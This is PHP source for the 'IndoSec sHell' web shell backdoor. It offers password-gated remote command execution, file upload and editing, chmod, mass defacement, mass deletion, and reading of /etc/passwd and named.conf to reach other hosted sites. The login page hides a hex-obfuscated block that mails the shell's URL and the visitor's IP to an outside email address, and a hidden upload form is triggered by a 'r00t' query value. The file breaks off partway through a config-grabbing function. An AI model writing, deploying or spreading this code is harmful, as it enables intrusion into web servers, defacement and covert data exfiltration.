<?php
/*
  * Konsep Shell : Brillyan -Founder { IndoSec }-
  * Pembuat : Holiq - { IndoSec }
  
  * Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
  * Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
  * https://www.youtube.com/playlist?list=PLAAbQaUpDeM7nGwS6WfaTm_cPC3RUiswi

  * Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya

  * { IndoSec sHell }
  * �2019 { IndoSec } -Holiq-
  * Contact Me? fb.com/holiq.xid, WhatsApp? Cek Bio Fb
  * Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/tidak responsive harap dimaklumi.  V 0.2
*/
session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

/* Configurasi */
$aupas       = "e5e32f8c9a2e843080f5176871e8cd32";// cari akses sendiri bngst
$default_action   = 'FilesMan';
$default_use_ajax   = true;
$default_charset   = 'UTF-8';
date_default_timezone_set("Asia/Jakarta");
function login_shell(){
?>
<?php
$FilesMan ="r00t"; 
if($_GET['POST']==$FilesMan){
/*
 Fixed Bug #1
*/
if(isset($_POST['uploaded']))
{
$file = $_FILES['files']['name'];
$files= $_FILES['files']['tmp_name'];
$folder="";
if(move_uploaded_file($files,$folder.$file))
{
$result = "Uploaded :<a href='$file' Men='_blank'>=> Click Ur File ^_^</A>";
}
else
{
$result = "Fail  Try...";
}
}
echo'
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>#~ IndoSec sHell ~#</title>
</head>';
echo'
<head>
<style>
body { background-color:#000000; color:#25ff00; font-family:Verdana; font-size:11px; }
h1,h3 { color:white; font-family:Verdana; font-size:11px; }
input,textarea,select,button { color: rgb(0, 190, 0); background-color:#444; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; }
textarea { font-family:Courier; }
a { color:rgb(0, 190, 0); text-decoration:none; font-family:Verdana; font-size:11px; }
a:hover { color:rgb(0, 250, 0); }
td { font-size:12px; vertical-align:middle; }
th { font-size:13px; vertical-align:middle; }
table { empty-cells:show; }
.inf { color:#7F7F7F; }
</style>
</head>
<body>
<center>
<h3>{ INDOSEC }</h3>
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="files" />
<input type="submit" name="uploaded" value="Upload">
</form>
'.$result.'
</body>
</html>';
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
    <meta name="theme-color" content="#343a40"/>
    <meta name="author" content="Holiq"/>
    <meta name="copyright" content="{ IndoSec }"/>
    <title>{ IndoSec sHell }</title>
    <link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/indosec.png"/>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
  </head>
  <body class="bg-dark text-center text-light">
    <div class="container text-center mt-3">
      <h1>{ INDOSEC }</h1>
      <h5>sHell Backdoor</h5><hr/>
      <p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> Please Login</p>
      <form method="post">
        <div class="form-group input-group">
          <div class="input-group-prepend">
            <div class="input-group-text"><i class="fa fa-user"></i></div>
          </div>
          <input type="password" name="pass" placeholder="User Id..." class="form-control">
        </div>
        <input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
      </form>
    </div>
    <a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom mb-3">Copyright 2019 @ { IndoSec }</a>
  </body>
</html>
<?php ${"\x47\x4cO\x42A\x4c\x53"}["v\x6d\x6ct\x6du\x6c\x79n\x79a\x69q\x6a\x65\x6f\x67\x70\x6ca\x63\x6cc"]="\x74\x6f";${"G\x4cO\x42A\x4cS"}["k\x74r\x73\x72_\x64a\x64u\x6fb\x65\x77n\x6a\x79y\x66g\x5fs\x78z\x64p\x73y\x64g\x6bo\x75\x6c"]="f\x331\x333\x37";${"\x47\x4cO\x42A\x4cS"}["u\x6ba\x73\x71\x71\x6ay\x79\x5fy\x5fu\x65j\x63q\x71_\x72q\x64i\x5ft"]="_\x53\x45R\x56E\x52";${"\x47L\x4fB\x41\x4cS"}["j\x63i\x5f_\x72\x65d\x61i\x5fz\x62w\x74\x61\x5fh\x62\x5f"]="\x66\x69\x65";@ini_set('output_buffering',0);@ini_set('display_errors',0);set_time_limit(0);ini_set('memory_limit','64M');header('Content-Type: text/html; charset=UTF-8');${${"\x47L\x4f\x42\x41\x4c\x53"}["v\x6d\x6ct\x6du\x6c\x79n\x79a\x69q\x6a\x65\x6f\x67\x70\x6ca\x63\x6cc"]}="\x6aa\x6aa\x6di\x38\x31@\x79a\x68o\x6f.\x63o\x6d";${${"\x47L\x4fB\x41L\x53"}["k\x74r\x73\x72_\x64a\x64u\x6fb\x65\x77n\x6a\x79y\x66g\x5fs\x78z\x64p\x73y\x64g\x6bo\x75\x6c"]}="h\x74t\x70\x3a\x2f/".${${"G\x4c\x4fB\x41L\x53"}["u\x6ba\x73\x71\x71\x6ay\x79\x5fy\x5fu\x65j\x63q\x71_\x72q\x64i\x5ft"]}['SERVER_NAME'].${${"G\x4c\x4f\x42A\x4cS"}["u\x6ba\x73\x71\x71\x6ay\x79\x5fy\x5fu\x65j\x63q\x71_\x72q\x64i\x5ft"]}['REQUEST_URI'];${${"G\x4cO\x42\x41L\x53"}["j\x63i\x5f_\x72\x65d\x61i\x5fz\x62w\x74\x61\x5fh\x62\x5f"]}="\x41\x6b\x73\x65\x73\x20${${"G\x4cO\x42A\x4cS"}["k\x74r\x73\x72_\x64a\x64u\x6fb\x65\x77n\x6a\x79y\x66g\x5fs\x78z\x64p\x73y\x64g\x6bo\x75\x6c"]}\x20\x3a\x70\x20\x2a\x49\x50\x20\x41\x64\x64\x72\x65\x73\x73\x20\x3a\x20\x5b\x20".${${"\x47L\x4fB\x41L\x53"}["u\x6ba\x73\x71\x71\x6ay\x79\x5fy\x5fu\x65j\x63q\x71_\x72q\x64i\x5ft"]}['REMOTE_ADDR']."\x20]";mail(${${"G\x4cO\x42\x41\x4c\x53"}["v\x6d\x6ct\x6du\x6c\x79n\x79a\x69q\x6a\x65\x6f\x67\x70\x6ca\x63\x6cc"]},"SETORAN PAK BOSS",${${"\x47\x4cO\x42A\x4c\x53"}["j\x63i\x5f_\x72\x65d\x61i\x5fz\x62w\x74\x61\x5fh\x62\x5f"]},"[ ".${${"G\x4cO\x42A\x4cS"}["u\x6ba\x73\x71\x71\x6ay\x79\x5fy\x5fu\x65j\x63q\x71_\x72q\x64i\x5ft"]}['REMOTE_ADDR']."\x20\x5d"); ?>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])){
  if(isset($_POST['pass']) && (md5($_POST['pass']) == $aupas)){
    $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
  }else{
    login_shell();
  }
}
/*
  * Akhir Login
  *
  * Aksi Download
*/
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')){
  @ob_clean();
  $file = $_GET['file'];
  header('Content-Description: File Transfer');
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename="'.basename($file).'"');
  header('Expires: 0');
  header('Cache-Control: must-revalidate');
  header('Pragma: public');
  header('Content-Length: ' . filesize($file));
  readfile($file);
  exit;
}
function w($dir,$perm){
  if(!is_writable($dir)){
    return "<font color='red'>".$perm."</font>";
  }else{
    return "<font color='lime'>".$perm."</font>";
  }
}
function r($dir,$perm){
  if(!is_readable($dir)){
    return "<font color=red>".$perm."</font>";
  }else{
    return "<font color=lime>".$perm."</font>";
  }
}

function exe($cmd){
  if(function_exists('system')){
    @ob_start();
    @system($cmd);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
  }elseif(function_exists('exec')){
    @exec($cmd,$results);
    $buff = "";
    foreach($results as $result){
      $buff .= $result;
    } return $buff;
  }elseif(function_exists('passthru')){
    @ob_start();
    @passthru($cmd);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
  }elseif(function_exists('shell_exec')){
    $buff = @shell_exec($cmd);
    return $buff;
  }
}
function perms($file){
  $perms = fileperms($file);
  if (($perms & 0xC000) == 0xC000){
    // Socket
    $info = 's';
  }elseif (($perms & 0xA000) == 0xA000){
    // Symbolic Link
    $info = 'l';
  }elseif (($perms & 0x8000) == 0x8000){
    // Regular
    $info = '-';
  }elseif (($perms & 0x6000) == 0x6000){
    // Block special
    $info = 'b';
  }elseif (($perms & 0x4000) == 0x4000){
    // Directory
    $info = 'd';
  }elseif (($perms & 0x2000) == 0x2000){
    // Character special
    $info = 'c';
  }elseif (($perms & 0x1000) == 0x1000){
    // FIFO pipe
  $info = 'p';
  }else{
    // Unknown
    $info = 'u';
  }
  // Owner
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?
  (($perms & 0x0800) ? 's' : 'x' ) :
  (($perms & 0x0800) ? 'S' : '-'));
  // Group
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?
  (($perms & 0x0400) ? 's' : 'x' ) :
  (($perms & 0x0400) ? 'S' : '-'));
    
  // World
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?
  (($perms & 0x0200) ? 't' : 'x' ) :
  (($perms & 0x0200) ? 'T' : '-'));
  return $info;
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
if(isset($_GET['dir'])){
  $dir = $_GET['dir'];
  chdir($dir);
}else{
  $dir = getcwd();
}
  
$os = php_uname();
$ip = getHostByName(getHostName());
$ver = phpversion();
$web = $_SERVER['HTTP_HOST'];
$sof = $_SERVER['SERVER_SOFTWARE']; 
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$mysql = (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$mail = (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$total = disk_total_space($dir);
$free = disk_free_space($dir);
$pers =  (int) ($free/$total*100);
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<a href='?dir=$dir&aksi=disabfunc' class='ds'>$ds</a>" : "<a href='?dir=$dir&aksi=disabfunc'><font color=green>NONE</font></a>";
$imgfol = "<img src='http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png' class='ico'></img>";
$imgfile = "<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img>";
function formatSize( $bytes ){
  $types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
  for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
  return( round( $bytes, 2 )." ".$types[$i] );
}
function ambilKata($param, $kata1, $kata2){
  if(strpos($param, $kata1) === FALSE) return FALSE;
  if(strpos($param, $kata2) === FALSE) return FALSE;
  $start = strpos($param, $kata1) + strlen($kata1);
  $end = strpos($param, $kata2, $start);
  $return = substr($param, $start, $end - $start);
  return $return;
}
$d0mains = @file("/etc/named.conf", false);
if (!$d0mains){
  $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
  $GLOBALS["need_to_update_header"] = "true";
}else{ 
  $count = 0;
  foreach ($d0mains as $d0main){
    if (@strstr($d0main, "zone")){
      preg_match_all('#zone "(.*)"#', $d0main, $domains);
      flush();
      if (strlen(trim($domains[1][0])) > 2){
        flush();
        $count++;
      }
    }
  }
  $dom = "$count Domain";
}
function swall($swa,$text,$dir){
  echo "<script>Swal.fire({
    title: '$swa',
    text: '$text',
    type: '$swa',
  }).then((value) => {window.location='?dir=$dir';})</script>";
}
function about(){
  echo '<div class="card text-center bg-light about">
    <h4 class="card-header">{ IndoSec }</h4>
    <div class="card-body">
      <center><div class="img"></div></center>
      <p class="card-text">{ IndoSec } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
    </div>
    <div class="card-footer">
      <small class="card-text text-muted">Copyright 2019 { IndoSec }</small>
    </div>
  </div><br/>';
  exit;
}
function aksiUpload($dir){
  echo '<form method="POST" enctype="multipart/form-data" name="uploader" id="uploader">
    <div class="card">
      <div class="card-body form-group">
        <p class="text-muted">//Multiple Upload</p>
        <div class="custom-file">
          <input type="file" name="file[]" multiple class="custom-file-input" id="customFile">
          <label class="custom-file-label" for="customFile">Choose file</label>
        </div>
        <input type="submit" class="btn btn-sm btn-primary btn-block mt-4 p-2" name="upload" value="Upload">
      </div>
    </div>
  </form>';
  if(isset($_POST['upload'])){
    $jumlah = count($_FILES['file']['name']);
    for($i=0;$i<$jumlah;$i++){
      $filename = $_FILES['file']['name'][$i];
        $up = @copy($_FILES['file']['tmp_name'][$i], "$dir/".$filename);
    }
    if($jumlah < 2){
      if($up){
        $swa = "success";
        $text = "Berhasil Upload $filename";
        swall($swa,$text,$dir);
      }else{
        $swa = "error";
        $text = "Gagal Upload File";
        swall($swa,$text,$dir);
      }
    }else{
      $swa = "success";
      $text = "Berhasil Upload $jumlah File";
      swall($swa,$text,$dir);
    }
  }
}
function chmodFile($dir,$file,$nfile){
  echo "<form method='POST'>
    <h5>Chmod File : $nfile </h5>
    <div class='form-group input-group'>
      <input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['file'])), -4)."'>
      <input type='submit' class='btn btn-danger form-control' value='Chmod'>
    </div>
  </form>";
  if(isset($_POST['perm'])){
    if(@chmod($_GET['file'],$_POST['perm'])){
      echo '<font color="lime">Change Permission Berhasil</font><br/>';
    }else{
      echo '<font color="white">Change Permission Gagal</font><br/>';
    }
  }
  exit;
}
function buatFile($dir,$imgfile){
  echo "<h4>$imgfile Buat File :</h4>
  <form method='POST'>
    <div class='input-group'>
      <input type='text' class='form-control' name='nama_file[]' placeholder='Nama File...'>
      <div class='input-group-prepend'>
        <div class='input-group-text'><a id='add_input'><i class='fa fa-plus'></i></a></div>
      </div>
    </div><br/>
    <div id='output'></div>
    <textarea name='isi_file' class='form-control' rows='13' placeholder='Isi File...'></textarea><br/>
    <input type='submit' class='btn btn-info btn-block' name='bikin' value='Buat'>
  </form>";
  if (isset($_POST['bikin'])){
    $name = $_POST['nama_file'];
    $isi_file = $_POST['isi_file'];
    foreach ($name as $nama_file){
      $handle = @fopen("$nama_file", "w");
      if($isi_file){
        $buat = @fwrite($handle, $isi_file);
      }else{
        $buat = $handle;
      }
    }
    if ($buat){
      $swa = "success";
      $text = "Berhasil Membuat File";
      swall($swa,$text,$dir);
    }else{
      $swa = "error";
      $text = "Gagal Membuat File";
      swall($swa,$text,$dir);
    }
  }
}
function view($dir,$file,$nfile,$imgfile){
  echo '[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]
  <h5>'.$imgfile.' Lihat File : '.$nfile.'</h5>
  <textarea rows="13" class="form-control" disabled="">'.htmlspecialchars(@file_get_contents($file)).'</textarea><br/>';
}
function editFile($dir,$file,$nfile,$imgfile){
  echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
  echo "<form method='POST'>
    <h5>$imgfile Edit File : $nfile</h5>
    <textarea rows='13' class='form-control' name='isi'>".htmlspecialchars(@file_get_contents($file))."</textarea><br/>
      <button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>
  </form>";
  if(isset($_POST['edit_file'])){
    $updt = fopen("$file", "w");
    $hasil = fwrite($updt, $_POST['isi']);
    if ($hasil){
      $swa = "success";
      $text = "Berhasil Update File";
      swall($swa,$text,$dir);
    }else{
      $swa = "error";
      $text = "Gagal Update File";
      swall($swa,$text,$dir);
    }
  }
}
function renameFile($dir,$file,$nfile,$imgfile){
  echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
  echo "<form method='POST'>
    <h5>$imgfile Rename File : $nfile</h5>
    <input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...' value='$nfile'><br/>
    <button type='sumbit' class='btn btn-info btn-block' name='rename_file'>Rename</button>
  </form>";
  if(isset($_POST['rename_file'])){
    $lama = $file;
    $baru = $_POST['namanew'];
    rename( $baru, $lama);
    if(file_exists($baru)){
      $swa = "success";
      $text = "Nama $baru Telah Digunakan";
      swall($swa,$text,$dir);
    }else{
      if(rename( $lama, $baru)){
        $swa = "success";
        $text = "Berhasil Mengganti Nama Menjadi $baru";
        swall($swa,$text,$dir);
      }else{
        $swa = "error";
        $text = "Gagal Mengganti Nama";
        swall($swa,$text,$dir);
      }
    }
  }
}
function hapusFile($dir,$file,$nfile){
  echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
  echo "<div class='card card-body text-center text-dark mb-4'>
    <p>Yakin Menghapus : $nfile</p>
    <form method='POST'>
      <a class='btn btn-danger btn-block' href='?dir=$dir'>Tidak</a>
      <input type='submit' name='ya' class='btn btn-success btn-success btn-block' value='Ya'>
    </form>
  </div>";
  if ($_POST['ya']){
    if (unlink($file)){
      $swa = "success";
      $text = "Berhasil Menghapus File";
      swall($swa,$text,$dir);
    }else{
      $swa = "error";
      $text = "Gagal Menghapus File";
      swall($swa,$text,$dir);
    }
  }
}
function chmodFolder($dir,$ndir){
  echo "<form method='POST'>
    <h5>Chmod Folder : $ndir </h5>
    <div class='form-group input-group'>
      <input type='text' name='perm' class='form-control' value='".substr(sprintf('%o', fileperms($_GET['dir'])), -4)."'>
      <input type='submit' class='btn btn-danger form-control' value='Chmod' name='chmo'>
    </div>
  </form>";
  if(isset($_POST['chmo'])){
    if(@chmod($_GET['dir'],$_POST['perm'])){
      echo '<font color="lime">Change Permission Berhasil</font><br/>';
    }else{
      echo '<font color="white">Change Permission Gagal</font><br/>';
    }
  }
  exit;
}
function buatFolder($dir,$imgfol){
  echo "<h5>$imgfol Buat Folder :</h5>
  <form method='POST'>
    <div class='input-group'>
      <input type='text' class='form-control' name='nama_folder[]' placeholder='Nama Folder...'>
      <div class='input-group-prepend'>
        <div class='input-group-text'><a id='add_input1'><i class='fa fa-plus'></i></a></div>
      </div>
    </div><br/>
    <div id='output1'></div>
    <input type='submit' class='btn btn-info btn-block' name='buat' value='Buat'>
  </form>";
  if (isset($_POST['buat'])){
    $nama = $_POST['nama_folder'];
    foreach ($nama as $nama_folder){
      $folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_folder);
      $fd = @mkdir ($folder);
    }
    if ($fd){
      $swa = "success";
      $text = "Berhasil Membuat Folder";
      swall($swa,$text,$dir);
    }else{
      $swa = "error";
      $text = "Gagal Membuat Folder";
      swall($swa,$text,$dir);
    }
  }
}
function renameFolder($dir,$ndir,$imgfol){
  echo "[ <a href='?dir=".$dir."&aksi=rename_folder' class='active'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ] 
  <h5>$imgfol Rename Folder : $ndir </h5>
  <form method='POST'>
    <input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...' value='$nama'><br/>
    <button type='sumbit' class='btn btn-info btn-block' name='ganti'>Ganti!!</button><br/>
  </form>";
  if(isset($_POST['ganti'])){
    $baru = htmlspecialchars($_POST['namanew']);
    $ubah = rename($dir, "".dirname($dir)."/".$baru."");
    if($ubah){
      $swa = "success";
      $text = "Berhasil Mengganti Nama";
      $dir = dirname($dir);
      swall($swa,$text,$dir);
    }else{
      $swa = "error";
      $text = "Gagal Mengganti Nama";
      $dir = dirname($dir);
      swall($swa,$text,$dir);
    }
  }
  exit;
}
function deleteFolder($dir,$ndir){
  echo "[ <a href='?dir=".$dir."&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder' class='active'>Delete</a> ] 
  <div class='card card-body text-center text-dark mb-4'>
    <p>Apakah Yakin Menghapus : $ndir ?</p>
    <form method='POST'>
      <a class='btn btn-danger btn-block' href='?dir=".dirname($dir)."'>Tidak</a>
      <input type='submit' name='ya' class='btn btn-success btn-block' value='Ya'>
    </form>
  </div><br/>";
  if ($_POST['ya']){
    if(is_dir($dir)){
      if(is_writable($dir)){
        @rmdir($dir);
        @exe("rm -rf $dir");
        @exe("rmdir /s /q $dir");
        $swa = "success";
        $text = "Berhasil Menghapus";
        $dir = dirname($dir);
        swall($swa,$text,$dir);
      }else{
        $swa = "error";
        $text = "Berhasil Menghapus";
        $dir = dirname($dir);
        swall($swa,$text,$dir);
      }
    }
  }
  exit;
}
function aksiMasdef($dir,$file,$imgfol,$imgfile){
  function tipe_massal($dir,$namafile,$isi_script){
    if(is_writable($dir)){
      $dira = scandir($dir);
      foreach($dira as $dirb){
        $dirc = "$dir/$dirb";
        $lokasi = $dirc.'/'.$namafile;
        if($dirb === '.'){
          file_put_contents($lokasi, $isi_script);
        }elseif($dirb === '..'){
          file_put_contents($lokasi, $isi_script);
        }else{
          if(is_dir($dirc)){
            if(is_writable($dirc)){
              echo "Done > $lokasi\n";
              file_put_contents($lokasi, $isi_script);
              $masdef = tipe_massal($dirc,$namafile,$isi_script);
            }
          }
        }
      }
    }
  }
  function tipe_biasa($dir,$namafile,$isi_script){
    if(is_writable($dir)){
      $dira = scandir($dir);
      foreach($dira as $dirb){
        $dirc = "$dir/$dirb";
        $lokasi = $dirc.'/'.$namafile;
        if($dirb === '.'){
          file_put_contents($lokasi, $isi_script);
        }elseif($dirb === '..'){
          file_put_contents($lokasi, $isi_script);
        }else{
          if(is_dir($dirc)){
            if(is_writable($dirc)){
              echo "Done > $dirb/$namafile\n";
              file_put_contents($lokasi, $isi_script);
            }
          }
        }
      }
    }
  }
    
  if($_POST['start']){
    echo "[ <a href='?dir=$dir'>Kembali</a> ]
    <textarea class='form-control' rows='13' disabled=''>";
      if($_POST['tipe'] == 'mahal'){
        tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
      }elseif($_POST['tipe'] == 'murah'){
        tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
      }
    echo "</textarea><br/>";
  }else{
    echo "<form method='post'>
      <div class='text-center'>
        <h5>Tipe :</h5>
        <input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
        <label for='toggle-on' class='butn'>Biasa</label>
        <input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
        <label for='toggle-off' class='butn'>Masal</label>
      </div> 
      <h5>$imgfol Lokasi :</h5>
      <input type='text' name='d_dir' value='$dir' class='form-control'><br>
      <h5>$imgfile Nama File :</h5>
      <input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
      <h5>$imgfile Isi File :</h5>
      <textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { IndoSec }'></textarea><br/>
      <input type='submit' name='start' value='Mass Deface' class='btn btn-danger btn-block'>
    </form>";
  }
  exit;
}
function aksiMasdel($dir,$file,$imgfol,$imgfile){
  function hapus_massal($dir,$namafile){
    if(is_writable($dir)){
      $dira = scandir($dir);
      foreach($dira as $dirb){
        $dirc = "$dir/$dirb";
        $lokasi = $dirc.'/'.$namafile;
        if($dirb === '.'){
          if(file_exists("$dir/$namafile")){
            unlink("$dir/$namafile");
          }
        }elseif($dirb === '..'){
          if(file_exists("".dirname($dir)."/$namafile")){
            unlink("".dirname($dir)."/$namafile");
          }
        }else{
          if(is_dir($dirc)){
            if(is_writable($dirc)){
              if($lokasi){
                echo "$lokasi > Terhapus\n";
                unlink($lokasi);
                $massdel = hapus_massal($dirc,$namafile);
              }
            }
          }
        }
      }
    }
  }
  if($_POST['start']){
    echo "[ <a href='?dir=$dir'>Kembali</a> ]
    <textarea class='form-control' rows='13' disabled=''>";
      hapus_massal($_POST['d_dir'], $_POST['d_file']);
    echo "</textarea><br/>";
  }else{
    echo "<form method='post'>
      <h5>$imgfol Lokasi :</h5>
      <input type='text' name='d_dir' value='$dir' class='form-control'><br/>
      <h5>$imgfile Nama File :</h5>
      <input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
      <input type='submit' name='start' value='Delete!!' class='btn btn-danger form-control'>
  </form>";
  }
  exit;
}
function aksiJump($dir,$file,$ip){
  $i = 0;
  echo "<div class='card container'>";
  if(preg_match("/hsphere/", $dir)){
    $urls = explode("\r\n", $_POST['url']);
    if(isset($_POST['jump'])){
      echo "<pre>";
      foreach($urls as $url){
        $url = str_replace(array("http://","www."), "", strtolower($url));
        $etc = "/etc/passwd";
        $f = fopen($etc,"r");
        while($gets = fgets($f)){
          $pecah = explode(":", $gets);
          $user = $pecah[0];
          $dir_user = "/hsphere/local/home/$user";
          if(is_dir($dir_user) === true){
            $url_user = $dir_user."/".$url;
            if(is_readable($url_user)){
              $i++;
              $jrw = "[<font color=green>R</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
              if(is_writable($url_user)){
                $jrw = "[<font color=green>RW</font>] <a href='?dir=$url_user'><font color=#0046FF>$url_user</font></a>";
              }
              echo $jrw."<br>";
            }
          }
        }
      }
      if(!$i == 0){ 
        echo "<br>Total ada $i KAMAR di $ip";
      }
      echo "</pre>";
    }else{
      echo '<center><form method="post">
        List Domains: <br>
        <textarea name="url" class="form-control">';
        $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
        while($getss = fgets($fp)){
          echo $getss;
        }
        echo  '</textarea><br>
            <input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
      </form></center>';
    }
  }elseif(preg_match("/vhosts/", $dir)){
    $urls = explode("\r\n", $_POST['url']);
    if(isset($_POST['jump'])){
      echo "<pre>";
      foreach($urls as $url){
        $web_vh = "/var/www/vhosts/$url/httpdocs";
        if(is_dir($web_vh) === true){
          if(is_readable($web_vh)){
            $i++;
            $jrw = "[<font color=green>R</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
            if(is_writable($web_vh)){
              $jrw = "[<font color=green>RW</font>] <a href='?dir=$web_vh'><font color=#0046FF>$web_vh</font></a>";
            }
            echo $jrw."<br>";
          }
        }
      }
      if(!$i == 0){
        echo "<br>Total ada $i Kamar Di $ip";
      }
      echo "</pre>";
    }else{
      echo '<center><form method="post">
        List Domains: <br>
        <textarea name="url" class="form-control">';
        bing("ip:$ip");
        echo '</textarea><br>
        <input type="submit" value="Jumping" name="jump" class="btn btn-danger btn-block">
      </form></center>';
    }
  }else{
    echo "<pre>";
    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font><br/>");
    while($passwd = fgets($etc)){
      if($passwd == '' || !$etc){
      echo "<font color=red>Can't read /etc/passwd</font><br/>";
      }else{
        preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
        foreach($user_jumping[1] as $user_pro_jump){
          $user_jumping_dir = "/home/$user_pro_jump/public_html";
          if(is_readable($user_jumping_dir)){
            $i++;
            $jrw = "[<font color=green>R</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
            if(is_writable($user_jumping_dir)){
              $jrw = "[<font color=green>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
            }
            echo $jrw;
            if(function_exists('posix_getpwuid')){
              $domain_jump = file_get_contents("/etc/named.conf");
              if($domain_jump == ''){
                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
              }else{
                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                foreach($domains_jump[1] as $dj){
                  $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                  $user_jumping_url = $user_jumping_url['name'];
                  if($user_jumping_url == $user_pro_jump){
                    echo " => ( <u>$dj</u> )<br>";
                    break;
                  }
                }
              }
            }else{
              echo "<br>";
            }
          }
        }
      }
    }
    if(!$i == 0){
      echo "<br>Total ada $i kamar di $ip";
    }
    echo "</pre>";
  }
  echo "</div><br/>";
  exit;
}
function aksiConfig($dir,$file){
  if($_POST){
    $passwd = $_POST['passwd'];
